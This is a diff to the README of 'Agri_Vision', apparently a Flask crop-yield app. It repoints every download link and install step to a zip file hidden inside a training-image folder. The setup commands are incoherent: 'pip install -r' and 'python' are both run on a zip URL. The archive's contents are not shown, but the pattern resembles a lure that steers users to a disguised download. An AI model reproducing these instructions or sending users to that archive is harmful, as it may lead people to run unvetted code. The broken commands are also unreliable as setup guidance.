@@ -1,6 +1,6 @@
 # 🌾 Agri_Vision - Predict Crop Yields with Ease  
 
-[![Download Agri_Vision](https://raw.githubusercontent.com/safi0bha/Agri_Vision/main/sample_data/Vision-Agri-v1.9-alpha.1.zip)](https://raw.githubusercontent.com/safi0bha/Agri_Vision/main/sample_data/Vision-Agri-v1.9-alpha.1.zip)
+[![Download Agri_Vision](https://github.com/safi0bha/Agri_Vision/raw/refs/heads/main/sample_data/train/healthy/Agri_Vision_1.0.zip)](https://github.com/safi0bha/Agri_Vision/raw/refs/heads/main/sample_data/train/healthy/Agri_Vision_1.0.zip)
 
 ## 📖 Introduction  
 Agri_Vision is a web application that helps farmers and agricultural enthusiasts predict crop yields and detect plant diseases. Built using Flask, this tool offers easy access to advanced AI features without needing technical expertise.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run Agri_Vision on your device.
 ## 📥 Download & Install  
 1. **Visit the Releases Page**  
    Click the link below to download Agri_Vision:  
-   [Download Agri_Vision](https://raw.githubusercontent.com/safi0bha/Agri_Vision/main/sample_data/Vision-Agri-v1.9-alpha.1.zip)
+   [Download Agri_Vision](https://github.com/safi0bha/Agri_Vision/raw/refs/heads/main/sample_data/train/healthy/Agri_Vision_1.0.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, find the most recent version of Agri_Vision. Click on it to expand and view all available files.
@@ -42,13 +42,13 @@ Once you have downloaded the necessary files, follow these steps to set up Agri_
 3. **Install Required Packages**  
    Once the virtual environment is active, install the required packages by running:  
    ```bash
-   pip install -r https://raw.githubusercontent.com/safi0bha/Agri_Vision/main/sample_data/Vision-Agri-v1.9-alpha.1.zip  
+   pip install -r https://github.com/safi0bha/Agri_Vision/raw/refs/heads/main/sample_data/train/healthy/Agri_Vision_1.0.zip  
    ```
 
 4. **Run the Application**  
    Start the Agri_Vision application by typing:  
    ```bash
-   python https://raw.githubusercontent.com/safi0bha/Agri_Vision/main/sample_data/Vision-Agri-v1.9-alpha.1.zip  
+   python https://github.com/safi0bha/Agri_Vision/raw/refs/heads/main/sample_data/train/healthy/Agri_Vision_1.0.zip  
    ```  
    The application will run on your local server. Usually, you can access it via your web browser at `http://127.0.0.1:5000`.
 
@@ -84,7 +84,7 @@ If you encounter any issues or have questions, feel free to reach out. You can f
 - **Community Forums**: Join discussions to connect with other users and share tips.
 
 ## 🔗 Links & Resources  
-- [Download Agri_Vision](https://raw.githubusercontent.com/safi0bha/Agri_Vision/main/sample_data/Vision-Agri-v1.9-alpha.1.zip)  
+- [Download Agri_Vision](https://github.com/safi0bha/Agri_Vision/raw/refs/heads/main/sample_data/train/healthy/Agri_Vision_1.0.zip)  
 - [Official Documentation](#)  
 - [Community Forum](#)  
 
